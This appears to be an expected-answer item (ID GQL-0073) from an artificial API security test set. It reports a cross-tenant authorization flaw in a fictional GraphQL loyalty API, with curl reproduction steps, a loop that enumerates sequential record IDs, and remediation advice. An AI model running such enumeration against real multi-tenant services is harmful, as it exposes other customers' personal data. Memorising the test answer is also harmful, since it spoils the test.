# Expected Response

## System
- Domain: Retail / Loyalty
- System: RewardCore Loyalty API
- Example ID: GQL-0073

## Priority Findings

### Finding 1: Predictable/Sequential Loyalty Record ID Enumeration — Cross-Tenant BOLA (Pattern 1.8)
**Severity:** Critical
**Category:** BOLA / Predictable IDs

**Summary:**
Per §5.0 (Pattern 1.8 — predictable or sequential IDs): The `getResource` / `listResources` resolvers accept client-supplied IDs without tenantId verification. Combined with predictable/sequential `resourceId` values, an attacker from `tenant-3d0e` can systematically enumerate loyalty account records belonging to `tenant-11b4`. In a retail loyalty platform, this exposes customer points balances, redemption history, and PII.

**Evidence from HAR:**
- Request: `POST https://api.rewardcore-loyalty.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-3d0e`
- Query: `listResources(tenantId: "tenant-11b4") { resourceId ownerId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-11b4"`, `ownerId: "other-user-3d0e11b4"`, `sensitiveField: "CONFIDENTIAL-3d0e11b4"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-3d0e11b4`

## Steps to Reproduce

### Step 1 — Cross-tenant loyalty record list (HAR)
```bash
curl -s -X POST https://api.rewardcore-loyalty.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-3d0e" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-11b4\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-3d0e11b4` from `tenant-11b4`. **Secure:** FORBIDDEN.

### Step 2 — Sequential ID enumeration
```bash
for id in R-2073 R-2072 R-2071 R-2070; do
  curl -s -X POST https://api.rewardcore-loyalty.example.com/graphql \
    -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
    -H "Content-Type: application/json" -H "x-tenant-id: tenant-3d0e" \
    -d "{\"query\": \"query { getResource(id: \\\"$id\\\") { resourceId tenantId data { sensitiveField } } }\"}"
done
```
**Vulnerable:** Sequential IDs return records from different tenants.

## Remediation
1. `listResources` must use JWT `tenantId` — discard client-supplied argument.
2. Resolver tenant guard on `getResource`: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
3. Use UUIDs (non-sequential) for `resourceId` to impede enumeration.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
